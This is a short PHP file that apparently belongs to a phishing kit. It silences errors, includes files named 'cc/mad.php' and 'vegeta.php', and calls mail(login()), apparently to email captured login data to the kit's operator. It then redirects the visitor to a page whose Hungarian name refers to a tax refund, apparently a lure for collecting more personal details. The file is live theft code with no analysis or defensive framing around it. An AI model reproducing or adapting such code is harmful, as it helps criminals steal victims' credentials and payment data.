<?php 
session_start();
error_reporting(0);
include("./cc/mad.php");
include("./vegeta.php");

mail( login());

$x=md5(microtime());$xx=sha1(microtime());
echo "<script> window.top.location.href = './adovisszaterites.php';   </script>";

 ?>